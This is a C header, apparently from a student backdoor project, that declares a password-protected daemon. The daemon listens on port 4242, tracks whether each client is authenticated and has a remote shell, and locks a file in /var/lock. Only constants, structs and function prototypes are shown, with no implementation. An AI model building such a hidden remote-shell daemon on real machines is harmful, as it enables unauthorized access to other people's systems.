#ifndef _PAYLOAD_H_
# define _PAYLOAD_H_

# include <unistd.h>
# include <signal.h>
# include <string.h>
# include <stdint.h>
# include <stdlib.h>

# include <sys/stat.h>
# include <sys/types.h>
# include <sys/file.h>

# define SRV_PORT 4242
# define MAXMSG 256
# define MAXCLIENT 3

# define PATH_FILE_LOCK "/var/lock/payload.lock"

# define KEY 4242
# define PASSWD_HASH 0x17c7a6ed1

typedef int SOCKET;

typedef struct			client_s
{
	uint8_t		auth;
	uint8_t		shell;
	SOCKET		sock;
}				client_t;

typedef struct			client_connect_s
{
	client_t		client[MAXCLIENT];
	fd_set			active_fd;
}				client_connect_t;

/*------------------ lock_daemon ------------------*/
int		lock_daemon(int *fd);
void		unlock_deamon(int *fd);
/*------------------ cred_daemon ------------------*/
int		check_credentials(void);
/*------------------ sig_daemon -------------------*/
int		create_server(void);
int		run_server(const int *sock);

#endif
